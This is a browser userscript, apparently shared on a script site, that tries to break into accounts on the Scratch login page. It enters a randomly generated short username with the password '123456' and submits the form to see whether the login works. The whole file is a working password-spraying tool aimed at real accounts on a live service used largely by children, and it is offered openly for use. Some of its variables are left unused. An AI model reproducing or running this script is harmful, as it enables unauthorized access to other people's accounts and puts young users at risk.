// ==UserScript==
// @name         Scratch Random Brute
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Bruteforcer Scratch Users to See if login is valid. (RANDOM)
// @license MIT
// @author       Merecule
// @run-at       document-end
// @match        https://scratch.mit.edu/login/
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        none
// @require     http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js
// @noframes
// @downloadURL https://update.greasyfork.org/scripts/449733/Scratch%20Random%20Brute.user.js
// @updateURL https://update.greasyfork.org/scripts/449733/Scratch%20Random%20Brute.meta.js
// ==/UserScript==
(function() {
    'use strict';

    var charLen = 4;
    var goal = 20;
    var containsNumbers = true;
    var contains_ = false;

    var nameList = [];

    function genUser() {
        var text = "";
        var possible = "" + ((containsNumbers) ? "1234567890" : "") + ((contains_) ? "________" : "");
        for (var i = 0; i < charLen; i++)
            if ((!i || i == charLen - 1 || text.indexOf("_") != -1) && contains_) {
                text += possible.charAt(Math.floor(Math.random() * (possible.length - 8)));
            } else {
                text += possible.charAt(Math.floor(Math.random() * possible.length));
            }
        return text;
    }

    var randUser = genUser();
    document.getElementById('id_username').value = randUser;
    document.getElementById('id_password').value = "123456";

    function _x(STR_XPATH) {
        var xresult = document.evaluate(STR_XPATH, document, null, XPathResult.ANY_TYPE, null);
        var xnodes = [];
        var xres;
        while (xres = xresult.iterateNext()) {
            xnodes.push(xres);
        }

        return xnodes;
    }
    window.jQuery(_x('//*[@id="content"]/form/button')).attr('id', 'modified-text').click();
})();